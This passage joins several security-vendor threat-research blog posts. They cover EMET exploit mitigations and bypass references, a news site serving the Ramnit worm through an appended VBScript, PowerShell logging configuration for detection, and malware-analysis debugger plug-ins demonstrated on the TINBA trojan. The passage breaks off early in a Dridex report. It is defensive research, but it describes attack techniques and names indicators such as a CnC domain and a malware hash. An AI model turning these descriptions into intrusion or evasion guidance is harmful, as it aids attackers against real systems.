 <p>ROP Mitigation - Stack Pivot: Detects if the stack has been pivoted.</p>
 <p>ROP Mitigation - Simulate Execution Flow: Detects ROP gadgets after
  a call to a critical Windows API, by manipulating and tracking the
  stack register.</p>
 <p>Bottom-up ASLR: Adds entropy of randomized 8-bits to the base
  address of the bottom-up allocations (including heaps, stacks, and
  other memory allocations).</p>
 <h4>EMET 4.x, released in April 18, 2013</h4>
 <p>Deep Hooks: With this feature enabled, EMET is no longer limited to
  hooking what it may consider as critical Windows APIs, instead it
  hooks even the lowest level of Windows APIs, which are usually used by
  higher level Windows APIs.</p>
 <p>Anti-detours: Because EMET places a jump instruction at the prologue
  of the detoured (hooked) Windows API functions, attackers can craft a
  ROP that returns to the instruction that comes after the detour jump
  instruction. This protection tries to stop these bypasses.</p>
 <p>Banned functions: By default it disallows calling
  ntdll!LdrHotpatchRoutine to prevent DEP/ASLR bypassing. Additional
  functions can be configured as well.</p>
 <p>Certificate Trust (configurable certificate pinning): Provides more
  checking and verification in the certificate chain trust validation
  process. By default it supports Internet Explorer only.</p>
 <h4>EMET 5.x, released in July 31, 2014</h4>
 <p>Introduced Attack Surface Reduction (ASR): Allows configuring list
  of modules to be blocked from being loaded in certain applications.</p>
 <p>EAF+: Similar to EAF, it provides additional functionality in
  protecting the export table of kernel32.dll, ntdll.dll and
  kernelbase.dll. It also detects MZ/PE reads and whether the stack
  pointer points somewhere outside of the stack boundaries or if there
  is a mismatch between the frame and the stack pointer.</p>
 <h4>References</h4>
 <p>[1] “Inside EMET 4.0” by Elias Bachaalany, <a href=""http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf"">http://recon.cx/2013/slides/Recon2013-Elias%20Bachaalany-Inside%20EMET%204.pdf</a><br />
  [2] “Bypassing EMET 4.1” by Jared DeMott, <a href=""http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/"">http://labs.bromium.com/2014/02/24/bypassing-emet-4-1/</a><br />
  [3] “Bypassing All of The Things” by Aaron Portnoy<br /> [4]
  &quot;Bypassing EMET 3.5's ROP Mitigations&quot; by Shahriyar
  Jalayeri, https://github.com/shjalayeri/emet_bypass<br /> [5]
  &quot;Bypassing EMET Export Address Table Access Filtering
  feature&quot; by Piotr Bania, <a href=""http://piotrbania.com/all/articles/anti_emet_eaf.txt"">http://piotrbania.com/all/articles/anti_emet_eaf.txt</a><br />
  [6] &quot;Disarming Enhanced Mitigation Experience Toolkit
  (EMET)&quot; by Offensive-Security, <a href=""https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/"">https://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet/</a><br />
  [7] &quot;Disarming EMET v5.0&quot; by Offensive-Security, <a href=""https://www.offensive-security.com/vulndev/disarming-emet-v5-0/"">https://www.offensive-security.com/vulndev/disarming-emet-v5-0/</a><br />
  [8] &quot;Disarming and Bypassing EMET 5.1&quot; by
  Offensive-Security, <a href=""https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/"">https://www.offensive-security.com/vulndev/disarming-and-bypassing-emet-5-1/</a></p>",http://www.fireeye.com/blog/threat-research/2016/02/using_emet_to_disabl.html
Maimed Ramnit Still Lurking in the Shadow,"<p>Newspapers have the ability to do more than simply keep us current
  with worldly affairs; we can use them to squash bugs! Yet, as we move
  from waiting on the newspaper delivery boy to reading breaking news on
  <i>e</i>Papers, we lose the subtle art of bug squashing. Instead, we
  end up exposing ourselves to dangerous digital bugs that can affect
  our virtual worlds.</p>
 <p>This is exactly what happened to visitors of one of the top five
  news sites of China. Any users running Internet Explorer (IE) who
  navigated to the website may have been exposed to an old, yet
  persistent VBScript worm that has the ability to self-replicate
  recursively from infected machines. Incidentally, the major actors
  involved with this old campaign have been taken down, yet traces of
  their injected recursive malware have still managed to sneak on to one
  of the highest browsed sites in China.</p>
 <p>The <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/dynamic-threat-intelligence.html"">FireEye
    Dynamic Threat Intelligence (DTI)</a> first discovered that the site
  was compromised and used to host VBS/Ramnit on Jan. 28, 2016. We can
  confirm that the infection is still live as of the time of this
  writing. IE users who visit the site may be compromised if they browse
  to a specific page (paperindex[.]htm) and click ‘Yes’ to run ActiveX,
  which may appear to be safe since the website is familiar and popular.
  There is no exploit used for infection, simply social engineering and
  errant clicks.</p>
 <p>As shown in Figure 1, a malicious VBScript is appeneded after the
  HTML body. Upon landing on this page, the victim’s browser will load
  the news content while it executes a malicious ActiveX component in
  the background.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure1.png"" />
  <span class=""type-XS"">Figure 1: Legitimate HTML page appended with
    malicious VBScript</span></p>
 <p>As shown in Figure 2 and Figure 3, the VBScript drops a binary named
  “svchost.exe” in the %TEMP% folder and executes it upon successful
  ActiveX execution. In a case where the system is compromised, it also
  tries to connect to a CnC server, fget-career[.]com, which has been
  involved in campaigns for this trojan before.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure2.png"" />
  <span class=""type-XS"">Figure 2: The VBScript drops the binary in the
    %TEMP% folder and executes it</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure3.png"" />
  <span class=""type-XS"">Figure 3: The full path to “svchost.exe” (using
    Internet Explorer 11 on Windows 7)</span></p>
 <p>Successful execution of the VBScript and the delivery of W32.Ramnit
  onto the victim’s machine depends on the user’s browser, as well as
  the browser’s setting. Since Chrome and Firefox do not support
  client-side VBScript, only IE users are susceptible to this attack.</p>
 <p>Fortunately, recent versions of IE do not run code automatically by
  default. Instead, users will see two popup warnings when the browser
  is rendering potentially dangerous objects such as ActiveX components,
  as shown in Figure 4 and Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure4.png"" />
  <span class=""type-XS"">Figure 4: First warning for blocked content in
    IE 11</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ramnit%20Hsu/figure5.png"" />
  <span class=""type-XS"">Figure 5: Second warning for blocked content in
    IE 11</span></p>
 <p>Only when the victim clicks on “Yes” will the browser execute the
  blocked content. In this case, the IE executes the VBScript, drops the
  payload, and executes it in the background while the user simply sees
  the usual news page.</p>
 <p>As long as users click “No” to disallow ActiveX components, they
  will remain safe from W32.Ramnit. However, this type of social
  engineering continues to be successful. When a legitimate site is
  compromised to host exploits or malware, the positive reputation of
  the site is leveraged to trick users into clicking “Yes” and becoming
  infected. The potential impact of this particular threat is compounded
  by the fact that the compromised site is ranked in the Alexa Top 100
  for most visited sites internationally, and is in the <a href=""http://www.alexa.com"" target=""_blank"">Top 25 for most popular
    websites in China</a> [1].</p>
 <p>FireEye appliances detect this infection at multiple levels.
  FireEye’s multiflow detection traces out the complete attack chain, as
  well as CnC communication. While the CnC host has been suspended for a
  long time, the worm’s presence alone can be a pain for the victim
  because it adds itself into all HTML files that it can access.
  Additionally, it adds itself to the startup registry and impacts the
  machine’s performance.</p>
 <p>So the question that you need to ask yourself is this: If a Top 100
  Alexa domain is still infected by this veteran malware, are you?</p>",http://www.fireeye.com/blog/threat-research/2016/02/maimed_ramnit_still.html
Greater Visibility Through PowerShell Logging,"<p>
  <i>UPDATE (Feb. 29): This post has been updated with new configuration
    recommendations due to the Feb. 24 rerelease of PowerShell 5, and
    now includes a link to a parsing script that users may find valuable.</i></p>
 <h2>Introduction</h2>
 <p>Mandiant is continuously investigating attacks that leverage
  PowerShell throughout all phases of the attack. A common issue we
  experience is a lack of available logging that adequately shows what
  actions the attacker performed using PowerShell. In those
  investigations, Mandiant routinely offers guidance on increasing
  PowerShell logging to provide investigators a detection mechanism for
  malicious activity and a historical record of how PowerShell was used
  on systems. This blog post details various PowerShell logging options
  and how they can help you obtain the visibility needed to better
  respond, investigate, and remediate attacks involving PowerShell.  </p>
 <h2>Background</h2>
 <p>Attackers and developers of penetration-testing frameworks are
  increasingly leveraging Windows PowerShell to conduct their
  operations. PowerShell is an extremely powerful command environment
  and scripting language that is built in to Microsoft Windows. By
  default, PowerShell does not leave many artifacts of its execution in
  most Windows environments. The combination of impressive functionality
  and stealth has made attacks leveraging PowerShell a nightmare for
  enterprise security teams<a name=""_ftnref1""></a>[1].</p>
 <p>PowerShell 2.0, which comes installed on all Windows 7/2008 systems,
  provides very little evidence of attacker activity. The Windows event
  logs show that PowerShell executed, the start and end times of
  sessions, and whether the session executed locally or remotely
  (ConsoleHost or ServerRemoteHost). However, they reveal nothing about
  what was executed with PowerShell. Figure 1 shows an example of the
  event log messages recorded in the PowerShell 2.0 log Windows PowerShell.evtx.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_1.png"" />
  <span class=""type-XS"">Figure 1: PowerShell Session Start in PowerShell 2.0</span></p>
 <p>Microsoft has been taking steps to improve the security transparency
  of PowerShell in recent versions. The most significant improvements,
  such as enhanced logging, were released in PowerShell version 5.0.
  This enhanced logging records executed PowerShell commands and
  scripts, de-obfuscated code, output, and transcripts of attacker
  activity. Enhanced PowerShell logging is an invaluable resource, both
  for enterprise monitoring and incident response.</p>
 <p>PowerShell 5.0 is the current release for Windows 7/2008 R2 and
  above. Though many of the enhanced logging features of PowerShell 5.0
  were backported to version 4.0, Mandiant recommends installing
  PowerShell 5.0 on all Windows platforms. PowerShell 5.0 includes
  features not available in 4.0, including suspicious script block logging.</p>
 <h2>Installation</h2>
 <p>Windows 10 does not require any software updates to support enhanced
  PowerShell logging.</p>
 <p>For Windows 7/8.1/2008/2012, upgrading PowerShell to enable enhanced
  logging in PowerShell 5.0 (recommended) requires:</p>
 <ul> <li>.NET 4.5</li> <li>Windows Management Framework (WMF) 4.0
    (Windows 7/2008 only)</li> <li>Windows Management Framework (WMF)
  5.0</li> </ul>
 <p>Windows 7 and 2008 R2 must be upgraded to Windows Management
  Framework (WMF) 4.0 prior to installing WMF 5.0.</p>
 <p>Enabling enhanced logging in PowerShell 4.0 for Windows
  7/8.1/2008/2012 requires:</p>
 <p>»      .NET 4.5<br /> »      Windows Management Framework (WMF)
  4.0<br /> »      The appropriate WMF 4.0 update<br />         -    
  8.1/2012 R2 – KB3000850<br />         -     2012 – KB3119938<br />    
      -     7/2008 R2 SP1 – KB3109118</p>
 <p>Downloading these updates from Microsoft may require the completion
  of an automated request process.</p>
 <h2>Logging Configuration</h2>
 <p>Logging must be configured through Group Policy as follows:</p>
 <p>
  <b>Administrative Templates → Windows Components → Windows PowerShell</b>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/dunwoody%20powershell/figure_2.png"" />
  <span class=""type-XS"">Figure 2: PowerShell configuration options</span></p>
 <p>PowerShell supports three types of logging: module logging, script
  block logging, and transcription. PowerShell events are written to the
  PowerShell operational log Microsoft-Windows-PowerShell%4Operational.evtx.</p>
 <h2>Module Logging</h2>
 <p>Module logging records pipeline execution details as PowerShell
  executes, including variable initialization and command invocations.
  Module logging will record portions of scripts, some de-obfuscated
  code, and some data formatted for output. This logging will capture
  some details missed by other PowerShell logging sources, though it may
  not reliably capture the commands executed. Module logging has been
  available since PowerShell 3.0. Module logging events are written to
  Event ID (EID) 4103.</p>
 <p>While module logging generates a large volume of events (the
  execution of the popular Invoke-Mimikatz script generated 2,285 events
  resulting in 7 MB of logs during testing), these events record
  valuable output not captured in other sources.</p>
 <p>To enable module logging:</p>
 <p>1.     In the “Windows PowerShell” GPO settings, set “Turn on Module
  Logging” to enabled.<br /> 2.     In the “Options” pane, click the
  button to show Module Name.<br /> 3.     In the Module Names window,
  enter <b>*</b> to record all modules.<br />     a.     Optional: To
  log only specific modules, specify them here. (Note: this is not
  recommended.)<br /> 4.     Click “OK” in the “Module Names”
  Window.<br /> 5.     Click “OK” in the “Module Logging” Window.</p>
 <p>Alternately, setting the following registry values will have the
  same effect:</p>
 <p>»     
  HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging
  → EnableModuleLogging = 1<br /> »     
  HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging
  \ModuleNames → * = *</p>
 <h2>Script Block Logging</h2>
 <p>Script block logging records blocks of code as they are executed by
  the PowerShell engine, thereby capturing the full contents of code
  executed by an attacker, including scripts and commands. Due to the
  nature of script block logging, it also records de-obfuscated code as
  it is executed. For example, in addition to recording the original
  obfuscated code, script block logging records the decoded commands
  passed with PowerShell’s -EncodedCommand argument, as well as those
  obfuscated with XOR, Base64, ROT13, encryption, etc., in addition to
  the original obfuscated code. Script block logging will not record
  output from the executed code. Script block logging events are
  recorded in EID 4104. Script blocks exceeding the maximum length of an
  event log message are fragmented into multiple entries. A script is
  available to parse script block logs and reassemble fragmented blocks
  (see reference 5).</p>
 <p>While not available in PowerShell 4.0, PowerShell 5.0 will
  automatically log code blocks if the block’s contents match on a list
  of suspicious commands or scripting techniques, even if script block
  logging is not enabled. These suspicious blocks are logged at the
  “warning” level in EID 4104, unless script block logging is explicitly
  disabled. This feature ensures that some forensic data is logged for
  known-suspicious activity, even if logging is not enabled, but it is
  not considered to be a security feature by Microsoft. Enabling script
  block logging will capture all activity, not just blocks considered
  suspicious by the PowerShell process. This allows investigators to
  identify the full scope of attacker activity. The blocks that are not
  considered suspicious will also be logged to EID 4104, but with
  “verbose” or “information” levels.</p>
 <p>Script block logging generates fewer events than module logging
  (Invoke-Mimikatz generated 116 events totaling 5 MB) and records
  valuable indicators for alerting in a SIEM or log monitoring platform.</p>
 <p>Group Policy also offers an option to “Log script block execution
  start / stop events”. This option records the start and stop of script
  blocks, by script block ID, in EIDs 4105 and 4106. This option may
  provide additional forensic information, as in the case of a
  PowerShell script executing over a long period, but it generates a
  prohibitively large number of events (96,458 events totaling 50 MB per
  execution of Invoke-Mimikatz) and is not recommended for most environments.</p>
 <p>To enable script block logging:</p>
 <p>1.     In the “Windows PowerShell” GPO settings, set “Turn on
  PowerShell Script Block Logging” to enabled.</p>
 <p>Alternately, setting the following registry value will enable logging:</p>
 <p>»     
  HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
  → EnableScriptBlockLogging = 1</p>
 <h2>Transcription</h2>
 <p>Transcription creates a unique record of every PowerShell session,
  including all input and output, exactly as it appears in the session.
  Transcripts are written to text files, broken out by user and session.
  Transcripts also contain timestamps and metadata for each command in
  order to aid analysis. However, transcription records only what
  appears in the PowerShell terminal, which will not include the
  contents of executed scripts or output written to other destinations
  such as the file system.</p>
 <p>PowerShell transcripts are automatically named to prevent
  collisions, with names beginning with “PowerShell_transcript”. By
  default, transcripts are written to the user’s documents folder, but
  can be configured to any accessible location on the local system or on
  the network. The best practice is to write transcripts to a remote,
  write-only network share, where defenders can easily review the data
  and attackers cannot easily delete them (see reference 2 below).
  Transcripts are very storage-efficient (less than 6 KB per execution
  of Invoke-Mimikatz), easily compressed, and can be reviewed using
  standard tools like grep.</p>
 <p>To enable transcription:</p>
 <p>1.     In the “Windows PowerShell” GPO settings, set “Turn on
  PowerShell Transcription” to enabled.<br /> 2.     Check the “Include
  invocation headers” box, in order to record a timestamp for each
  command executed.<br /> 3.     Optionally, set a centralized
  transcript output directory.</p>
 <p>This directory should be a write-only, restricted network share that
  security personnel can access. If no output directory is specified,
  the transcript files will be created under the user’s documents directory.</p>
 <p>Alternately, setting the following registry values will enable logging:</p>
 <p>
  <br /> »      
  HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
  → EnableTranscripting = 1<br /> »     
   HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
  → EnableInvocationHeader = 1<br /> »      
  HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription
  → OutputDirectory = “” (Enter path. Empty = default)</p>
 <h2>Log Settings</h2>
 <p>Where possible, Mandiant recommends enabling all three log sources:
  module logging, script block logging and transcription. Each of these
  sources records unique data valuable to analyzing PowerShell activity.
  In environments where log sizes cannot be significantly increased,
  enabling script block logging and transcription will record most
  activity, while minimizing the amount of log data generated. At a
  minimum, script block logging should be enabled, in order to identify
  attacker commands and code execution.</p>
 <p>Ideally, the size of the PowerShell event log
  Microsoft-Windows-PowerShell%4Operational.evtx should be increased to
  1 GB (or as large as your organization will allow) in order to ensure
  that data is preserved for a reasonable period. PowerShell logging
  generates large volumes of data that quickly rolls the log (up to 1 MB
  per minute has been observed during typical admin or attacker activity).</p>
 <p>The Windows Remote Management (WinRM) log,
  Microsoft-Windows-WinRM%4Operational.evtx, records inbound and
  outbound WinRM connections, including PowerShell remoting connections.
  The log captures the source (inbound connections) or destination
  (outbound connections), along with the username used to authenticate.
  This connection data can be valuable in tracking lateral movement
  using PowerShell remoting. Ideally, the WinRM log should be set to a
  sufficient size to store at least one year of data.</p>
 <p>Due to the large number of events generated by PowerShell logging,
  organizations should carefully consider which events to forward to a
  log aggregator. In environments with PowerShell 5.0, organizations
  should consider, at a minimum, aggregating and monitoring suspicious
  script block logging events, EID 4104 with level “warning”, in a SIEM
  or other log monitoring tool. These events provide the best
  opportunity to identify evidence of compromise while maintaining a
  minimal dataset.</p>
 <h2>Appendices</h2>
 <ul> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/powershell-logging-appendix-a.pdf"" target=""_blank"">Appendix
      A: Module Logging</a> displays the contents of one module logging
    event generated during the execution of the <span class=""code"">Invoke-Mimikatz</span> PowerShell script.</li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/powershell-logging-appendix-b.pdf"" target=""_blank"">Appendix
      B: Script Block Logging</a> displays the contents of one script
    block logging event generated during the execution of the <span class=""code"">Invoke-Mimikatz</span> script.</li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/powershell-logging-appendix-c.pdf"" target=""_blank"">Appendix
      C: PowerShell Transcription</a> contains a sample transcript
    generated when executing <span class=""code"">Invoke-Mimikatz</span>.</li> </ul>
 <h2>References</h2>
 <ol> <li>
    <a href=""http://blogs.msdn.com/b/powershell/archive/2016/01/19/windows-management-framework-wmf-4-0-update-now-available-for-windows-server-2012-windows-server-2008-r2-sp1-and-windows-7-sp1.aspx"">http://blogs.msdn.com/b/powershell/archive/2016/01/19/windows-management-framework-wmf-4-0-update-now-available-for-windows-server-2012-windows-server-2008-r2-sp1-and-windows-7-sp1.aspx</a></li> <li>
    <a href=""http://blogs.msdn.com/b/powershell/archive/2015/06/09/powershell-the-blue-team.aspx"">http://blogs.msdn.com/b/powershell/archive/2015/06/09/powershell-the-blue-team.aspx</a></li> <li>
    <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/solutions/pdfs/wp-lazanciyan-investigating-powershell-attacks.pdf"">https://www.fireeye.com/content/dam/fireeye-www/global/en/solutions/pdfs/wp-lazanciyan-investigating-powershell-attacks.pdf</a></li> <li>
    <a href=""https://blogs.msdn.microsoft.com/powershell/2016/02/24/windows-management-framework-wmf-5-0-rtm-packages-has-been-republished/"">https://blogs.msdn.microsoft.com/powershell/2016/02/24/windows-management-framework-wmf-5-0-rtm-packages-has-been-republished/</a></li> <li>
    <a href=""https://github.com/matthewdunwoody/block-parser"">https://github.com/matthewdunwoody/block-parser</a></li> </ol>
 <p>Special thanks to Lee Holmes and the Microsoft PowerShell team.</p>
 <p>[1] See the Shmoocon 2016 presentation “No Easy Breach” by Mandiant
  consultants Matthew Dunwoody and Nick Carr for some additional context
  of our experience analyzing PowerShell attacks: https://archive.org/details/No_Easy_Breach.</p>",http://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html
FLARE Script Series: flare-dbg Plug-ins,"<h3>
  <b>Introduction</b></h3>
 <p>This post continues the FireEye Labs Advanced Reverse Engineering
  (FLARE) script series. In this post, we continue to discuss the <span class=""code"">flare-dbg</span> project. If you haven’t read my <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/12/flare_script_series.html"" target=""_blank"">first
    post on using <span class=""code"">flare-dbg</span> to automate string
  decoding,</a> be sure to check it out!</p>
 <p>We created the <span class=""code"">flare-dbg</span> Python project to
  support the creation of plug-ins for WinDbg. When we harness the power
  of WinDbg during malware analysis, we gain insight into runtime
  behavior of executables. <span class=""code"">flare-dbg</span> makes
  this process particularly easy. This blog post discusses WinDbg
  plug-ins that were inspired by features from other debuggers and
  analysis tools. The plug-ins focus on collecting runtime information
  and interacting with malware during execution. Today, we are
  introducing three <span class=""code"">flare-dbg</span> plug-ins, which
  are summarized in Table 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/table_1_plug-in_summary.png"" /></p>
 <p>
  <span class=""type-XS"">Table 1: flare-dbg plug-in summary</span></p>
 <p>To demonstrate the functionality of these plug-ins, this post uses a
  banking trojan (MD5: 03BA3D3CEAE5F11817974C7E4BE05BDE) known as TINBA
  to FireEye.</p>
 <h3>
  <b>injectfind</b></h3>
 <h5>
  <b>Background</b></h5>
 <p>A common technique used by malware is code injection. When malware
  allocates a memory region to inject code, the created region contains
  certain characteristics we use to identify them in a process’s memory
  space. The <span class=""code"">injectfind</span> plug-in finds and
  displays information about injected regions of memory from within WinDbg.</p>
 <p>The <span class=""code"">injectfind</span> plug-in is loosely based
  off the Volatility <span class=""code"">malfind</span> plug-in. Given a
  memory dump, the Volatility variant searches memory for injected code
  and shows an analyst injected code found within processes. Instead of
  requiring a memory dump, the <span class=""code"">injectfind</span>
  WinDbg plug-in runs in a debugger. Similar to <span class=""code"">malfind</span>, the <span class=""code"">injectfind</span>
  plug-in identifies memory regions that may have had code injected and
  prints a hex dump and a disassembly listing of each identified memory
  region. A quick glance at the output helps us identify injected code
  or hooked functions. The following section shows an example of an
  analyst identifying injected code with <span class=""code"">injectfind</span>.</p>
 <h5>
  <b>Example</b></h5>
 <p>After running the TINBA malware in an analysis environment, we
  observe that the initial loader process exits immediately, and the
    <span class=""code"">explorer.exe </span>process begins making network
  requests to seemingly random domains. After attaching to the <span class=""code"">explorer.exe</span> process with Windbg and running the
    <span class=""code"">injectfind</span> plug-in, we see the output
  shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_1_injectfind.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Output from the injectfind plug-in</span>
  <br /> <br /> The first memory region at virtual address <span class=""code"">0x1700000</span> appears to contain references to Windows
  library functions and is <span class=""code"">0x17000</span> bytes in
  size. It is likely that this memory region contains the primary
  payload of the TINBA malware.</p>
 <p>The second memory region at virtual address <span class=""code"">0x1CD0000</span> contains a single page, <span class=""code"">0x1000</span> bytes in length, and appears to have two
  lines of meaningful disassembly. The disassembly shows
  the eax register being set to <span class=""code"">0x30</span> and a
  jump five bytes into the <span class=""code"">NtCreateProcessEx</span> function. Figure 2 shows the
  disassembly of the first few instructions of the <span class=""code"">NtCreateProcessEx</span> function.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_2_ntcreateprocessex.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: NtCreateProcessEx disassembly listing</span></p>
 <p>The first instruction for <span class=""code"">NtCreateProcessEx</span> is a <span class=""code"">jmp</span> to an address outside of ntdll's memory. The
  destination address is within the first memory region that <span class=""code"">injectfind</span> identified as injected code. We can
  quickly conclude that the malware creates a function hook for process
  creation all from within a Windbg debugger session.</p>
 <h3>
  <b>membreak</b></h3>
 <h5>
  <b>Background</b></h5>
 <p>One feature missing from Windbg that is present in <a href=""http://www.ollydbg.de/"">OllyDbg</a> and <a href=""http://x64dbg.com/"">x64dbg</a> is the ability to set a
  breakpoint on an entire memory region. This type of breakpoint is
  known as a memory breakpoint. Memory breakpoints are used to pause a
  process when a specified region of memory is executed.</p>
 <p>Memory breakpoints are useful when you want to break on code
  execution without specifying a single address. For example, many
  packers unpack their code into a new memory region and begin executing
  somewhere in this new memory. Setting a memory breakpoint on the new
  memory region would pause the debugger at the first execution anywhere
  within the new memory region. This obviates the need to tediously
  reverse engineer the unpacking stub to identify the original entry point.</p>
 <p>One way to implement memory breakpoints is by changing the memory
  protection for a memory region by adding the <span class=""code"">PAGE_GUARD</span> memory protection flag. When this
  memory region is executed, a <span class=""code"">STATUS_GUARD_PAGE_VIOLATION</span> exception occurs. The
  debugger handles the exception and returns control to the user. The
    <span class=""code"">flare-dbg </span>plug-in <span class=""code"">membreak</span> uses this technique to implement memory breakpoints.</p>
 <h5>
  <b>Example</b></h5>
 <p>After locating the injected code using the <span class=""code"">injectfind</span> plug-in, we set a memory breakpoint to
  pause execution within the injected code memory region. The <span class=""code"">membreak</span> plug-in accepts one or multiple addresses
  as parameters. The plug-in takes each address, finds the base address
  for the corresponding memory region, and changes the entire region’s
  permissions. As shown in Figure 3, when the <span class=""code"">membreak</span> plug-in is run with the base address of
  the injected code as the parameter, the debugger immediately begins
  running until one of these memory regions is executed.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_3_membreak.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: membreak plug-in run in Windbg</span></p>
 <p>The output for the memory breakpoint hit shows a <span class=""code"">Guard page violation</span> and a message about first
  chance exceptions. As explained above, this should be expected. Once
  the breakpoint is hit, the <span class=""code"">membreak</span> plug-in
  restores the original page permissions and returns control to the analyst.</p>
 <h3>
  <b>importfind</b></h3>
 <h5>
  <b>Background</b></h5>
 <p>Malware often loads Windows library functions at runtime and stores
  the resolved addresses as global variables. Sometimes it is trivial to
  resolve these statically in IDA Pro, but other times this can be a
  tedious process. To speed up the labeling of these runtime imported
  functions, we created a plug-in named <span class=""code"">importfind</span> to find these function addresses.
  Behind the scenes, the plug-in parses each library's export table and
  finds all exported function addresses. The plug-in then searches the
  malware’s memory and identifies references to the library function
  addresses. Finally, it generates an IDAPython script that can be used
  to annotate an IDB workspace with the resolved library function names.</p>
 <h5>
  <b>Example</b></h5>
 <p>Going back to TINBA, we saw text referencing Windows library
  functions in the output from <span class=""code"">injectfind</span>
  above. The screenshot of IDA Pro in Figure 2 shows this same region of
  data. Note that following each ASCII string containing an API name,
  there is a number that looks like a pointer. Unfortunately, IDA Pro
  does not have the same insight as the debugger, so these addresses are
  not resolved to API functions and named.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_4_before_impfind.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Unnamed library function addresses</span></p>
 <p>We use the <span class=""code"">importfind</span> plug-in to find the
  function names associated with these addresses, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_5_import_find.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: importfind plug-in run in Windbg</span></p>
 <p>The <span class=""code"">importfind</span> plug-in generates an IDA
  Python script file that is used to rename these global variables in
  our IDB as shown in Figure 2. Figure 6 shows a screenshot from IDA Pro
  after the script has renamed the global variables to more meaningful names.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20plug-ins%20Tyler/figure_6_named_global_vars.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: IDA Pro with named global variables</span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>This blog post shows the power of using the<span class=""code"">
  flare-dbg</span> plug-ins with a debugger to gain insight into how the
  malware operates at runtime. We saw how to identify injected code
  using the <span class=""code"">injectfind</span> plug-in and create
  memory breakpoints using <span class=""code"">membreak</span>. We also
  demonstrated the usefulness of the <span class=""code"">importfind</span> plug-in for identifying and renaming
  runtime imported functions.</p>
 <p>To find out how to setup and get started with flare-dbg, head over
    the <a href=""https://github.com/fireeye/flare-dbg"">github project
    page</a><u> </u>where you’ll learn about setup and usage.</p>",http://www.fireeye.com/blog/threat-research/2016/02/flare_script_series.html
Dridex Botnet Resumes Spam Operations After the Holidays,"<p>FireEye Labs observed that Dridex operators were active during the <a href=""https://www.fireeye.com/blog/threat-research/2016/01/holiday_season_2015.html"">holiday
  season</a>. However, during the post-Christmas and New Year weeks, we
  observed a slowdown in their spam campaigns.</p>
 <p>Interestingly, their breaks were short. Over the past few weeks they
  have resumed operations and are building momentum. A small Dridex
  spike was seen in the first week of January 2016, followed by a few
  large waves of Dridex campaigns in the following weeks, as seen in
  Figure 1. FireEye Labs has studied this prolific spam botnet in the
  past, detailing some of its delivery mechanisms <a href=""https://www.fireeye.com/blog/threat-research/2015/06/evolution_of_dridex.html"">here</a>
  and its takedown recovery <a href=""https://www.fireeye.com/blog/threat-research/2015/10/macros_galore.html"">here</a>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%201.png"" />
  <span class=""type-XS"">Figure 1. Malicious .doc and .xls attachment
    counts through January</span></p>
 <p>These campaigns largely targeted the manufacturing,
  telecommunications, and financial services sectors, as seen in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%202.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Targeted industries</span></p>
 <p>In addition, the campaigns mostly targeted the United States and
  United Kingdom, as seen in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Dridex%20returns/Figure%203.png"" /></p>
 <p>
